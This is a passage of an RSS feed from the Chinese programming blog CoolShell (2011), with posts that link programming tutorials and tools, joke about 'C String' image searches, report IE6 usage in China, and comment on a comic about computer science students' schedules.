昨天和大家说了一下关于口令破解的一些东西，那篇文章告诉我们需要设置一个比较强的不易破解的口令。
今天在网上看到一个强大的jQu...'>
<meta itemprop="datePublished" content="2011-03-03T09:26:41+08:00">
<meta itemprop="dateModified" content="2011-12-21T23:16:18+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3877.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3877.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.97">
<meta itemprop="ratingCount" content="35">
</div>
</div>
<div id="post-ratings-3877-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-03T09:26:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/3877.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些有意思的贴子和工具 ]]></title>
<link>https://coolshell.cn/articles/3903.html</link>
<content><![CDATA[ 
<p>又到了介绍各种杂项的时候了，正如以前的这三篇（<a title="一些非常有意思的杂项资源" href="https://coolshell.cn/articles/3013.html" target="_blank">这篇</a>，<a title="一些杂项资源" href="https://coolshell.cn/articles/3437.html" target="_blank">这篇</a>，和<a title="一些有意思的网站和贴子" href="https://coolshell.cn/articles/3480.html" target="_blank">这篇</a>）文章一样，本篇文章也给你介绍一些最近出现的一些有趣的东西。希望你能喜欢。</p>
<p>先说找工作吧，电影《<a title="社交网络（豆瓣）" href="https://movie.douban.com/subject/3205624/" target="_blank">该页无法显示</a>》里的那个<a href="https://www.facebook.com" target="_blank">facebook</a>主页上的<strong><a title="FaceBook的招聘题" href="https://www.facebook.com/careers/puzzles.php" target="_blank">招聘网页</a></strong>上是列了一堆问题，你可以去看看，你可以使用c/c++，Erlang，Haskell，Java，Perl，Python，PHP，Ruby来解题，不过只接受Unix/Linux下的版本， 不接受Windows的版本。无独有偶，<a href="https://www.dropbox.com/" target="_blank">DropBox</a>的<strong><a title="DropBox的招聘题 " href="https://www.dropbox.com/jobs/challenges" target="_blank">招聘网页</a></strong>上也是些算法题，大家可以过去看看，不过需要翻墙。（现在，对于美国互联网企业来说，如果你没有被<a title="中国的C2C模式" href="https://coolshell.cn/articles/3820.html" target="_blank">C2C</a>，说明你根本不存在，如果你没有被墙，说明你还不算成功）</p>
<p>接下来给大家介绍一些文档和教程吧，都是英文的。</p>
<ul>
<li>
<strong><a href="http://www.harding.edu/fmccown/java_csharp_comparison.html" target="_blank">Java和C#的完整比较</a></strong>。这是一个相当完整的比较Java和C#语言的网页。很有意思，有助于你了解Java和C#的各种特性和不同。</li>
</ul>
<ul>
<li>
<strong><a href="http://use-the-index-luke.com/" target="_blank">SQL 性能调优</a></strong>。这个文档覆盖了<em>IBM DB2</em>, <em>MySQL</em>, <em>Oracle</em>,<em>PostgreSQL</em> 和 <em>Microsoft SQL Server</em>。不过这个电子书还没有写完，你可以使用其<a href="http://use-the-index-luke.com/blog/feed" target="_blank">RSS</a>, <a href="https://twitter.com/MarkusWinand">twitter</a> 或 <a title="Like on Facebook" href="https://www.facebook.com/plugins/like.php?href=http://www.facebook.com/pages/Use-The-Index-Luke/157726730906717?ref%3Dts&amp;layout=standard&amp;show_faces=true&amp;width=250&amp;action=like&amp;colorscheme=light&amp;height=80">Facebook</a> 来跟踪其进度。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.cleveralgorithms.com/" target="_blank">Clever Algorithms</a></strong>。这个电子书也是免费的。其主要面向一些AI和面向自然的算法，一共45个。其包括概率随机算法，迭代进化算法，物理算法，可能性算法，蚂蚁蜜蜂式算法，免疫算法，神经算法等。里面大量的高等数学公式对我来说我已经看不懂了。不过，我相信这个电子书非常适合搞理论研究的人，或是需要抄袭一篇论文以顺利毕业的人使用。</li>
</ul>
<ul>
<li>
<strong><a href="http://blog.gingertech.net/wp-content/uploads/2011/01/LCA_MM_AVProc2011/#slide1" target="_blank">HTML5 Audio &amp; Video 处理</a></strong>。这是一组在线的幻灯片，请使用键盘光标键翻页。这是一组带着各种演示的幻灯片，对于你要学习HTML5的声音和视频相关的知识很有帮助。</li>
</ul>
<ul>
<li>
<strong><a href="https://www.mikeash.com/pyblog/friday-qa-2010-12-31-c-macro-tips-and-tricks.html" target="_blank">C 语言的宏</a></strong>。你想知道C语的宏有哪些有些意思的用法吗？这篇文档不会让你失望的。其由浅入深地向你介绍了宏的各种用法。</li>
</ul>
<ul>
<li>
<strong><a href="http://stringoftheseus.com/blog/2011/01/10/api-sorting-algorithms/" target="_blank">各种语言的排序算法</a></strong>。你想知道各种语言其默认的排序算法用的是<a title="一个排序算法比较的网站" href="https://coolshell.cn/articles/399.html" target="_blank">哪种排序算法</a>吗？看看这篇文章吧。</li>
</ul>
<ul>
<li>
<strong><a href="http://fixplz.blourp.com/blog/=phys" target="_blank">物理模拟F#教程</a></strong>。相信你一定玩过那种游戏，画一个任意形状的石头，其会从天上落下以砸下面的一个东西，这个教程用.NET的F#向大家说明了这种东西怎么去做。（<a href="http://fixplz.blourp.com/blog/img/fsphys.rar" target="_blank">演示程序</a>）</li>
</ul>
<p><span id="more-3903"></span></p>
<ul>
<li>
<strong><a href="http://www.helixsoft.nl/articles/circle/sincos.htm" target="_blank">Sin &amp; Cos游戏教程</a></strong>。这篇文章向你介绍了一些游戏编程的技术。</li>
</ul>
<ul>
<li>
<strong><a href="http://damienradtke.org/unofficial-introduction-to-gnome-application-dev/" target="_blank">GNOME开发介绍</a></strong>。这是一个非官方的介绍GNOME应用开发的教程，简单清楚，很适合初学者。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.korokithakis.net/tutorials/python" target="_blank">10分钟学会Python</a></strong>。是的，也许你和我一样，很恨这样几天就学好一门语言的书，比如：<a title="“21天教你学会C++”" href="https://coolshell.cn/articles/2250.html" target="_blank">21天学好C++</a>。这个更夸张，10分钟。TNND。不过，当我看了一下后，我觉得其很适合初学者对Python有一个感性的认识。</li>
</ul>
<ul>
<li>
<strong><a href="http://nicolasgallagher.com/css-drop-shadows-without-images/" target="_blank">CSS阴影教程</a></strong>。这是一篇教你种CSS做出种式样式的阴影效果的教程，这里是<a href="http://nicolasgallagher.com/css-drop-shadows-without-images/demo/" target="_blank">演示</a>。</li>
</ul>
<ul>
<li>
<strong><a href="http://gergo.erdi.hu/blog/2011-02-13-developing_iphone_applications_in_haskell___a_tutorial/" target="_blank">用Haskell开发iPhone应用</a></strong>。这是一个教程序，告诉你如何用Haskell开发iOS的应用程序。</li>
</ul>
<p>下面，再让我给你介绍一些和Web开发相关的开源的库。</p>
<ul>
<li>
<strong><a href="http://www.photon-project.com/" target="_blank">Photon</a></strong>。这是一个号称高性能的轻量级的PHP应用服务器框架。号称比Zend，Symfony和mod_php快3-10倍。</li>
</ul>
<ul>
<li>
<strong><a href="http://web.chemdoodle.com/" target="_blank">ChemDoodle</a></strong>。这是一个用来画一些化学分子式的基于HTML5的类库和API，支持2D/3D，很强大。兼容于所有产商的支持HTML5的浏览器。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.limejs.com/" target="_blank">LimeJS</a></strong>。这个JS库可以让你方便得制作一些触摸屏的小游戏。<a href="http://www.limejs.com/static/roundball/index.html" target="_blank">演示一</a>，<a href="http://www.limejs.com/static/zlizer/index.html" target="_blank">演示二</a>。（<a title="JS游戏引擎列表" href="https://coolshell.cn/articles/3516.html" target="_blank">一些游戏相关的JS</a>）</li>
</ul>
<ul>
<li>
<strong><a href="https://github.com/ruidlopes/spellcheckthejs" target="_blank">拼写检查</a></strong>。这是一个英文拼写检查的JS。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.clips.ua.ac.be/pages/pattern" target="_blank">Pattern</a></strong>。这是东东很强大，用于做Web挖掘，其有一组工具用来从Google, Twitter, Wikipedia，Web爬虫，HTML上获得数据，并进行文本分析和数据图形化显示。你可以上这里看看<a href="http://www.clips.ua.ac.be/demos" target="_blank">相关演示</a>。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.appcelerator.com/products/titanium-mobile-application-development/">Titanium Mobile</a></strong>。你想让你的代码同时支持iPhone和Android吗？这是一个跨平台的开发工具。这里有<a href="http://agiliq.com/blog/2011/02/iphoneandroid-application-development-using-titani/" target="_blank">一个教程</a>。</li>
</ul>
<ul>
<li>
<strong><a href="http://css3buttons.michaelhenriksen.dk/" target="_blank">CSS3的按钮</a></strong>。这里可以去下载一个CSS3的库，里面有N多的按钮风格，感觉都很酷。</li>
</ul>
<p>接下来，介绍一些小工具。</p>
<ul>
<li>
<strong><a href="https://caniuse.com/" target="_blank">Web兼容性表</a></strong>。你想看看各种浏览器对HTML5，CSS3，SVG的支持吗？这个网站可以让你看到所有的主流浏览器的兼容表。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.qgrep.com/" target="_blank">qgrep</a></strong>。嫌grep不够快吗？试试qgrep吧，支持OSX,  Linux 和 Windows。</li>
</ul>
<ul>
<li>
<strong><a href="http://www.cam.hi-ho.ne.jp/oishi/indexen.html" target="_blank">XKeymacs</a></strong>。你有Emacs情结吗？如果有的话，试试这个工具吧，在windows里到处c-x c-c, c-x c-s, c-p, c-n什么什么的。挺有意思的。好吧，不是有意思，是BT。</li>
</ul>
<ul>
<li>
<strong><a href="https://www.sublimetext.com/blog/articles/sublime-text-2-public-alpha" target="_blank">Sublime Text 2</a></strong>。虽然目前只是Alpha版本，但是这个看上去真的很不错。尤其是用来查看代码。支持Windows, Linux和OSX。</li>
</ul>
<ul>
<li>
<strong><a href="https://code.google.com/p/vs-android/" target="_blank">VS-Android</a></strong>。这个项目让你可以在Visual Studio 2010的IDE下开发Android NDK C/C++的程序。</li>
</ul>
<p>其它东西。</p>
<ul>
<li>
<strong><a href="http://rigaux.org/language-study/scripting-language/" target="_blank">脚本语言排名</a></strong>。这个网页不但对所有的脚本语言进行了排名，还对一些操作进行了比较。</li>
</ul>
<ul>
<li>HTML5的3D演示，这里有几个HTML5的3D演示，你可以看看，<a title="sketch/" href="http://hakim.se/experiments/html5/sketch/#1966de71" target="_blank">演示一</a>，<a title="蛋白质分子式" href="https://jolecule.appspot.com/pdb/1mbo#view:4mfct8" target="_blank">演示二</a>，<a title="立方体" href="https://dl.dropbox.com/u/59304/labs/cubeStable.html" target="_blank">演示三</a>，<a title="坦克游戏" href="https://dl.dropbox.com/u/59304/labs/tankGame.html" target="_blank">演示四</a>。</li>
</ul>
<ul>
<li>说到Web上的3D，你可能需要看看Adobe的<a title="Molehill APIs" href="http://labs.adobe.com/technologies/flashplatformruntimes/incubator/features/molehill.html" target="_blank">Molehill (3D GPU accelerated) APIs</a>，这里有一篇<a href="http://www.bytearray.org/?p=2810" target="_blank">介绍文章</a>。</li>
</ul>
<ul>
<li>还记得那个<a title="流体力学的演示" href="https://coolshell.cn/articles/3421.html" target="_blank">流体力学的演示</a>吗？现在有人把其做到了<a href="http://www.infi.nl/blog/view/id/98/Liquid_on_iPhone_and_iPad" target="_blank">iPhone/iPad上</a>。</li>
</ul>
<p>就这么多吧，也许没什么意思，那也请你见谅了。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5537.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_title">一些文章资源和趣闻</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3903" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="faece634e1">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>18</strong> 人打了分，平均分： <strong>4.33</strong> )<br><span class="post-ratings-text" id="ratings_3903_text"></span><meta itemprop="name" content="一些有意思的贴子和工具">
<meta itemprop="headline" content="一些有意思的贴子和工具">
<meta itemprop="description" content="又到了介绍各种杂项的时候了，正如以前的这三篇（这篇，这篇，和这篇）文章一样，本篇文章也给你介绍一些最近出现的一些有趣的东西。希望你能喜欢。

先说找工作吧，电影《该页无法显示》里的那个facebook主页上的招聘网页上是列了一堆问题，你可以去看看，你可以使用c/c++，Erlang，Haskell，Java，Perl，Python，PHP，Ruby来解题，不过只接受Unix/Linux下的版本...">
<meta itemprop="datePublished" content="2011-03-04T08:25:39+08:00">
<meta itemprop="dateModified" content="2011-03-04T11:18:59+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3903.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3903.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.33">
<meta itemprop="ratingCount" content="18">
</div>
</div>
<div id="post-ratings-3903-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-04T08:25:39+08:00</pubDate>
<guid>https://coolshell.cn/articles/3903.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Google图片搜索下的的C String ]]></title>
<link>https://coolshell.cn/articles/3806.html</link>
<content><![CDATA[ 
<p>周五了，来轻松一下。如果你在Google的图片搜索里搜索“C String”，你会看到很多相当Sexy的图片，C String真是很性感，丁字裤（T String）已经算不了什么了，看了一下图片，才发现原来还有男士了，太猛了。</p>
<p><a href="https://www.google.com.hk/images?hl=zh-cn&amp;newwindow=1&amp;safe=strict&amp;q=C%20String&amp;um=1&amp;ie=UTF-8&amp;source=og&amp;sa=N&amp;tab=wi&amp;biw=1280&amp;bih=677"><img alt="image placeholder" ></a></p>
<p>如果C String是这个样子，那么，其尾部应该有null终止符，而且最危险的是缓冲区溢出（Buffer Overflow）。哈哈。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/3549.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3549.html" class="wp_rp_title">Android将允许纯C/C++开发应用</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12199.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12199.html" class="wp_rp_title">C++ STL string的Copy-On-Write技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3806" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="442cd32376">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>21</strong> 人打了分，平均分： <strong>4.33</strong> )<br><span class="post-ratings-text" id="ratings_3806_text"></span><meta itemprop="name" content="Google图片搜索下的的C String">
<meta itemprop="headline" content="Google图片搜索下的的C String">
<meta itemprop="description" content="周五了，来轻松一下。如果你在Google的图片搜索里搜索“C String”，你会看到很多相当Sexy的图片，C String真是很性感，丁字裤（T String）已经算不了什么了，看了一下图片，才发现原来还有男士了，太猛了。



如果C String是这个样子，那么，其尾部应该有null终止符，而且最危险的是缓冲区溢出（Buffer Overflow）。哈哈。">
<meta itemprop="datePublished" content="2011-03-04T12:40:40+08:00">
<meta itemprop="dateModified" content="2011-03-03T23:34:10+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3806.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3806.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.33">
<meta itemprop="ratingCount" content="21">
</div>
</div>
<div id="post-ratings-3806-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-04T12:40:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/3806.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 中国仍是IE6的重灾区 ]]></title>
<link>https://coolshell.cn/articles/3921.html</link>
<content><![CDATA[ 
<p>“IE6于10年前诞生，现在应该是我们同IE6告别的时候了。”微软公司日前推出IE6倒计时网站（the Internet Explorer 6 Countdown，网址为<span style="color: #0066cc;"><a href="http://www.ie6countdown.com/" target="_blank">www.ie6countdown.com</a></span>），旨在尽早淘汰IE6，让用户升级到新版IE浏览器。</p>
<p>值得注意一点的是，在这张百分比图上所显示的目前仍在使用IE6浏览器上网的百分比第一的是中国——34.5%，这个符合我国国情——什么都要争第一。我国人口世界第一占全世界1/4，网民也是世界第一，还在使用IE6的网民占全世界的1/3，可以我国网民的严重落后。根据<a href="https://www.cnnic.net.cn/dtygg/dtgg/201101/t20110118_20250.html" target="_blank">CNNIC今年的报告</a>，我国现有4.5亿网民，34%也就是1.5亿用户，也就是说你身边每三个人中就有一个在用IE6。而中国的IE6网民占全世界使用IE6网民的一半。</p>
<p>另外，我发现亚洲是重灾区啊，包括中日韩台印都很猛啊，看来微软在亚洲的营销的确不错。</p>
<p><img alt="image placeholder" ></p>
<p>我查看了一下Coolshell.cn的2011年到今天为止访问统计，排名第一是的Chrome(41.5%)，第二位的是Firefox(23.22%)，第三位的是IE8(10.7%)，第四位的是IE6(4.8%)。IE6的IP数有6400+。</p>
<p>看来，在我国程序员这个人群中，越来越多的人使用Chrome+Firefox，挺喜人的，但是IE6还有4.8%，还不如土耳其，马来西亚，印尼等国家。<br>
</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3921" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="a680e62041">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>3.82</strong> )<br><span class="post-ratings-text" id="ratings_3921_text"></span><meta itemprop="name" content="中国仍是IE6的重灾区">
<meta itemprop="headline" content="中国仍是IE6的重灾区">
<meta itemprop="description" content="“IE6于10年前诞生，现在应该是我们同IE6告别的时候了。”微软公司日前推出IE6倒计时网站（the Internet Explorer 6 Countdown，网址为www.ie6countdown.com），旨在尽早淘汰IE6，让用户升级到新版IE浏览器。

值得注意一点的是，在这张百分比图上所显示的目前仍在使用IE6浏览器上网的百分比第一的是中国——34.5%，这个符合我国国情——什么...">
<meta itemprop="datePublished" content="2011-03-10T08:41:05+08:00">
<meta itemprop="dateModified" content="2011-03-19T01:26:56+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3921.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3921.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.82">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3921-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-10T08:41:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/3921.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 计算机专业学生的大学生活 ]]></title>
<link>https://coolshell.cn/articles/3928.html</link>
<content><![CDATA[ 
<p>下面看到某国外的同学描述的自己的大学生活，呵呵。做一下解释，</p>
<ul>
<li>正常的生活是，10点到17点上课，17点到22点是放松和work（chill相当于relax），22点到凌晨1点是社交活动，然后睡8小时。</li>
<li>计算机专业的学生的生活是，只要你脑子还在转就work，脑子不转了，就睡2小时。（<del>原来，国外的计算机大学的同学们在大学时就已在疯狂工作了，课都不上</del>）（work是在校的学术作业项目（谢谢网友rho指正））</li>
</ul>
<figure style="width: 584px" class="wp-caption aligncenter"><a href="https://i.imgur.com/4kQAz.jpg" target="_blank"><img alt="image placeholder" ></a><figcaption class="wp-caption-text">计算机专业学生的大学生活</figcaption></figure>
<p>不过，看了一下上面的代码，我发现了两个问题：</p>
<ol>
<li>sleep(2)，在posix下是秒，在windows下是毫秒。</li>
<li>(hour &gt;= 22  &amp;&amp;  hour &lt; 1) 这个表达式永假。正确的是(hour &gt;= 22 || hour &lt; 1)</li>
</ol>
<p>当然，我们并不能下结论——该同学的在学校里并没有学好编程。因为，你不知道Sleep 和 &amp;&amp; 有没有被重载了。（你要把&amp;&amp;在某些情况下重载成||的行为也不是不可能 。<strong>注：在c++中，你无法重载内建类型的操作符</strong>）</p>
<p>——————</p>
<p><span style="color: #008000;">最后说明一下，最近事太多（一个项目要上线，另一个项目需求分析和设计、招聘、酷壳服务器迁移、带孩子、申请签证、给人做培训），所以没有更新，大家见谅</span>。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3928" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="9b34557498">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>3.64</strong> )<br><span class="post-ratings-text" id="ratings_3928_text"></span><meta itemprop="name" content="计算机专业学生的大学生活">
<meta itemprop="headline" content="计算机专业学生的大学生活">
<meta itemprop="description" content="下面看到某国外的同学描述的自己的大学生活，呵呵。做一下解释，

	正常的生活是，10点到17点上课，17点到22点是放松和work（chill相当于relax），22点到凌晨1点是社交活动，然后睡8小时。
